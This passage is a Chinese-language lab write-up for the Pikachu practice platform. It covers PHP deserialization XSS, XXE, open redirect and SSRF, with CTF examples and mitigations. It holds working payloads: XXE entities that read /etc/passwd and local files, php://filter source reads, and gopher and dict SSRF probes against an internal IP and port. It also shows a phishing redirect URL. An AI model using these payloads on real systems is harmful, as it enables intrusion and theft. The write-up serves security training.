        $html.="<p>大兄弟,来点劲爆点儿的!</p>";
    }else{
        $html.="<p>{$unser->test}</p>";
    }

}
```

**没有对用户传进来的参数做过滤，直接反序列化。**

**利用相似的代码生成一个反序列化的字符串**

```php
<?php
class S{
    var $test = "<script>alert('xss')</script>";
}
$a = new S();
echo serialize($a);
?>
```

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715113815.png)**

**提交payload:`O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}`**

**反序列化的结果是一个 JS 的弹窗，我们提交后就能进行 XSS 攻击**

## **XXE**

### **基础知识准备**

> **XXE -"xml external entity injection" 即"xml外部实体注入漏洞"。**
> **概括一下就是"攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题"**
> **也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。**
> **现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。**
> **以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。**
>
> **本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。**

**XML是可扩展的标记语言（E`X`tensible `M`arkup `L`anguage），设计用来进行数据的传输和存储， 结构是树形结构，由标签构成，这点很像HTML语言。但是XML和HTML有明显区别如下：**

```
XML 被设计用来传输和存储数据，其焦点是数据的内容。
HTML 被设计用来显示数据，其焦点是数据的外观。
```

**XML语法结构大致如下**

```xml
第一部分：XML声明部分
<?xml version="1.0"?>

第二部分：文档类型定义 DTD
<!DOCTYPE note[ 
<!--定义此文档是note类型的文档-->
<!ENTITY entity-name SYSTEM "URI/URL">
<!--外部实体声明-->
]>

第三部分：文档元素
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```

**DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD，现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。**

```xml
① 内部申明DTD格式
<!DOCTYPE 根元素 [元素申明]>

② 外部引用DTD格式
<!DOCTYPE 根元素 SYSTEM "外部DTD的URI">

③ 引用公共DTD格式
<!DOCTYPE 根元素 PUBLIC "DTD标识名" "公共DTD的URI">
```

### **Pikachu**

**内部实体引用 Payload**

```xml
<?xml version = "1.0"?>
<!DOCTYPE note [
    <!ENTITY hacker "hihihi">
]>
<name>&hacker;</name>
```

**如果用构造的`payload`始终无法成功，修改一哈PhpStudy的php版本即可**

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715113809.png)**

**外部实体引用 Payload**

**![外部引用支持的协议](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715114611.png)**

**在D盘下新建一个jwt.txt,内容为hahaha,作为我们要读取的文件**

**使用file协议读取**

```xml
<?xml version="1.0"  encoding="UTF-8"?>
<!DOCTYPE name [
<!ENTITY f SYSTEM "file:///D://jwt.txt">]>
<name>&f;</name>
```

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715115834.png)**

**使用php协议读取**

```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "php://filter/read=convert.base64-encode/resource=D://jwt.txt">
]>
<x>&f;</x>
```

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715120128.png)**

**Linux下读取**

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[ 
<!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>
```

**源码分析**

```php
$html='';
if(isset($_POST['submit']) and $_POST['xml'] != null){
    $xml =$_POST['xml'];
    $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);//添加了LIBXML_NOENT参数开启了外部实体解析
    if($data){
        $html.="<pre>{$data}</pre>";
    }else{
        $html.="<p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?</p>";
    }
}
```

**如果一个接口支持接收XML数据，且没有对XML数据做任何安全上的措施，就可能导致XXE漏洞。**

**simplexml_load_string()函数转换形式良好的XML字符串为SimpleXMLElement对象。**

### **XXE漏洞防范**

**方案：使用开发语言提供的禁用外部实体的方法**
**1.PHP：**

```php
libxml_disable_entity_loader(true);
```

**2.JAVA：**

```java
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
```

**3.Python：**

```python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

### **CTF实例**

#### **题目 Jarvis OJ--api调用**

**题目地址：http://web.jarvisoj.com:9882/**

**解题思路:**

**XXE漏洞就是服务器接受从客户端发送来的xml格式数据时，xml数据中恶意的引用了外部实体，将它的值绑定为服务器的目标文件，这样在服务器返回给我们解析后的值时，就会把目标文件的内容返回给我们，我们就读取了敏感文件。**

**这道题目，默认的是json格式传递，因此首先我们更改`Content-Type`的值为`application/xml`,然后传入xml代码：**

**Payload**

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[ 
<!ENTITY f SYSTEM "file:///home/ctf/flag.txt">
]>
<x>&f;</x>
```

**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715165006.png)**

## **URL重定向**

>**不安全的URL跳转问题可能发生在一切执行了URL地址跳转的地方。**
>**如果后端采用了前端传进来的参数(可能是用户传参,或者之前预埋在前端页面的URL地址)作为了跳转的目的地,而又没有做判断的话就可能发生"跳错对象"的问题。**
>
>**URL跳转比较直接的危害是:-->钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站**

**1.进入页面是四个超链接，依次点一遍，点到最后一句时，发现URL带有参数**

```url
http://127.0.0.1/pikachu-master/vul/urlredirect/urlredirect.php?url=i
```

**2.我们可以直接把参数`i`,改为钓鱼网站的网址，这里我就假设我的博客是钓鱼网站**

```url
http://127.0.0.1/pikachu-master/vul/urlredirect/urlredirect.php?url=https://jwt1399.top
```

**3.把上面这个URL发送给用户，用户点击就会跳转到钓鱼网站**

**源码分析**

```php
$html="";
if(isset($_GET['url']) && $_GET['url'] != null){
    $url = $_GET['url'];
    if($url == 'i'){
        $html.="<p>好的,希望你能坚持做你自己!</p>";
    }else {
        header("location:{$url}");
    }
}
```

**通过GET请求获取前端传进来的url，判断是否等于i，如果不等，就跳转到url对应的地址去。这就存在URL重定向问题。**

 **修复**

**对url进行白名单的限制，如果不在白名单，就跳转到固定的页面**

## **SSRF**

> **SSRF(Server-Side Request Forgery:服务器端请求伪造)，其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制**
>
> **导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据**
>
> **数据流:攻击者----->服务器---->目标地址**
>
> **简单理解：服务器接受了客户端输入的URL，然后服务器端拿URL去请求并返回给你。**

**根据后台使用的函数的不同,对应的影响和利用方法又有不一样**
```
PHP中下面函数的使用不当会导致SSRF:
file_get_contents()
fsockopen()
curl_exec()    
```

**如果一定要通过后台服务器远程去对用户指定("或者预埋在前端的请求")的地址进行资源请求,则请做好目标地址的过滤。**

### **curl**

**PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。**

**libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。**

**curl函数参考：https://www.runoob.com/php/php-ref-curl.html**

```
//file协议读取
?url=file:///D://jwt.txt

//gopher协议
//基本协议格式：URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流
?url=gopher://119.23.243.154:22

//dict协议
?url=dict://119.23.243.154:22

//http/https协议
?url=http://x.x.x.x/
?url=https://x.x.x.x/

//探测内网其他主机的端口
?url=http://x.x.x.x:port
```

| **file协议**                                                 | **http/https协议**                                           | **端口**                                                     |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715182340.png)** | **![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715182343.png)** | **![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715182346.png)** |

**源码分析**

```php
if(isset($_GET['url']) && $_GET['url'] != null){
    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
    $URL = $_GET['url'];
    $CH = curl_init($URL);
    curl_setopt($CH, CURLOPT_HEADER, FALSE);
    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
    $RES = curl_exec($CH);
    curl_close($CH) ;
    echo $RES;
}
```

**前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端，并且没做任何过滤或限制。从而导致了用户可能可以通过这个漏洞进行一些内网服务探测等等**

**参考：[SSRF原理实战及修复方式](https://segmentfault.com/a/1190000021810264)**

### **file_get_content**

**file_get_contents() 把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。**

**函数语法:  file_get_contents(path,include_path,context,start,max_length)**

| **参数**         | **描述**                                                     |
| ---------------- | ------------------------------------------------------------ |
| **path**         | **必需。规定要读取的文件。**                                 |
| **include_path** | **可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 '1'。** |
| **context**      | **可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。** |
| **start**        | **可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。** |
| **max_length**   | **可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。**      |

```
//file协议读取
?file=file:///D://jwt.txt

//读取php源码
?file=php://filter/read=convert.base64-encode/resource=ssrf.php

//内网其它主机请求
?file=http://x.x.x.x/xx.index

//探测内网其他主机的端口
?file=http://x.x.x.x:port
	
```

**源码分析**

```php
if(isset($_GET['file']) && $_GET['file'] !=null){
    $filename = $_GET['file'];
    $str = file_get_contents($filename);
    echo $str;
}
```

**直接访问获取到的文件**

### **SSRF防范**

**1.可以采取白名单,限制内网Ip。**
**2.对返回内容进行识别**
**3.禁用一些不必要的协议**
**4.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态**

**参考：[CTF Wiki-SSRF](https://wiki.x10sec.org/web/ssrf/)、[SSRF 学习记录](https://hackmd.io/@Lhaihai/H1B8PJ9hX?type=view#SSRF-学习记录)、[SSRF漏洞分析与利用](http://www.91ri.org/17111.html)**

### **CTF实例**

**题目：hackme--XSSRF**

**题目地址：https://xssrf.hackme.inndy.tw/**

**解题思路：**

**这个题一共有三关，xss->ssrf->redis**

**参考：**

**[XSS的威力：从XSS到SSRF再到Redis](https://www.anquanke.com/post/id/156377)**

**[xss->ssrf->redis](https://skysec.top/2018/08/17/xss-ssrf-redis/)**

**[XSSme题目复现](http://www.northity.com/2018/10/23/XSSme题目复现/)**



## **赞助💰**

**如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭**

<table>
  <tbody>
     <tr>
         <td style="text-align:center;">支付宝支付</td>
         <td style="text-align:center;">微信支付</td>
     </tr>
   <tr>
    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
  </tr>
</tbody></table>